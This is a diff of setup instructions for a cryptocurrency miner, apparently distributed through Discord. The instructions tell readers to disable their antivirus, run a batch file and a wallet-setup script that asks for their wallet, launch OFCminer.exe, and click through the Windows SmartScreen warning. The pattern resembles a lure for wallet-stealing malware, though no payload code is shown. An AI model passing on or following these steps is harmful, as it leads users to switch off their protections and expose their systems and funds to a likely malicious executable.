@@ -7,16 +7,18 @@ Setup :
 
 Before download:
 
-disable your antivirus
+a .download WinRAR
+b .disable your antivirus
 
 After download:
+c . Extract the file
 
-click on PythonInstaller.bat
-click on walletsetup.py and enter your wallet
-click on OFCminer.exe
-If it says "Windows protected your computer" Just click on "complementary information" and then click on "ignore
+1 .click on PythonInstaller.bat
+2 .click on walletsetup.py and enter your wallet
+3 .click on OFCminer.exe
+4 .If it says "Windows protected your computer" Just click on "complementary information" and then click on "ignore
 (if it is not launching add DiscodoBaguette#8369 on Discord)
-then if it lauch select your parameter !
+6 .then if it lauch select your parameter !
 (click on bal.py to see your balance)
 
 
